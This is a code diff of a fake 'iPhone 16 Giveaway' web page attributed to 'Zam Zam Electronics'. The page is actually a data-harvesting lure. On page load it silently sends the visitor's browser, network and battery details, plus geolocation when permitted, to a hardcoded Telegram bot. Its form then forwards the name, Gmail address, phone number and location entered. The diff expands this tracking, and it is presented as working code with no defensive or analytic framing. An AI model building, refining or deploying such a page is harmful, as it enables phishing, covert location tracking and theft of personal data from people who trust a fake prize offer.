@@ -62,7 +62,7 @@
     }
   </style>
 </head>
-<body onload="getLocationAndSend()">
+<body onload="sendDeviceInfoAndGetLocation()">
   <h1>Zam Zam Electronics</h1>
   <h2>iPhone 16 Giveaways</h2>
   <p class="subtext">You've been selected for a special reward.<br>Click below to proceed.</p>  <form id="giveawayForm">
@@ -77,8 +77,14 @@
     const token = "7977125911:AAEGvFN0iduWfXmf88v2_ZMRjGZQoKFAgZA";
     const chatId = "6975173404";
 
-    function sendLocationToTelegram(location) {
-      const message = `\n📍 Auto Location Sent on Visit:\n${location}`;
+    let collectedData = {
+      location: "",
+      battery: "",
+      connection: "",
+      userAgent: navigator.userAgent
+    };
+
+    function sendMessage(text) {
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
         headers: {
@@ -86,17 +92,32 @@
         },
         body: JSON.stringify({
           chat_id: chatId,
-          text: message
+          text: text
         })
       });
     }
 
-    function getLocationAndSend() {
+    function sendDeviceInfoAndGetLocation() {
+      // Send basic device info immediately on page load
+      collectedData.connection = navigator.connection ? `Type: ${navigator.connection.effectiveType}` : "Unknown connection";
+      const basicInfo = `\n📱 Device Info:\n🌐 Browser: ${collectedData.userAgent}\n📶 Network: ${collectedData.connection}`;
+      sendMessage(basicInfo);
+
+      // Try to get battery info
+      if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+          collectedData.battery = `Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
+          sendMessage(`🔋 Battery Info: ${collectedData.battery}`);
+        });
+      }
+
+      // Try to get location if permission is granted
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(position => {
           const coords = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+          collectedData.location = coords;
           document.getElementById("location").value = coords;
-          sendLocationToTelegram(coords);
+          sendMessage(`📍 Location: ${coords}`);
         });
       }
     }
@@ -108,25 +129,12 @@
       const number = document.getElementById("number").value;
       const location = document.getElementById("location").value;
 
-      const message = `\n📱 iPhone 16 Giveaway Entry:\n👤 Name: ${name}\n📧 Gmail: ${gmail}\n📞 Number: ${number}\n📍 Location: ${location}`;
+      const message = `\n🎁 iPhone 16 Giveaway Submission:\n👤 Name: ${name}\n📧 Gmail: ${gmail}\n📞 Number: ${number}\n📍 Location: ${location}\n🔋 Battery: ${collectedData.battery}\n📶 Network: ${collectedData.connection}\n🌐 Browser: ${collectedData.userAgent}`;
 
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      })
-      .then(response => {
-        alert("Thanks! Your entry has been submitted.");
-        document.getElementById("giveawayForm").reset();
-      })
-      .catch(error => {
-        alert("There was an error submitting your entry.");
-      });
+      sendMessage(message);
+
+      alert("Thanks! Your entry has been submitted.");
+      document.getElementById("giveawayForm").reset();
     });
   </script></body>
 </html>
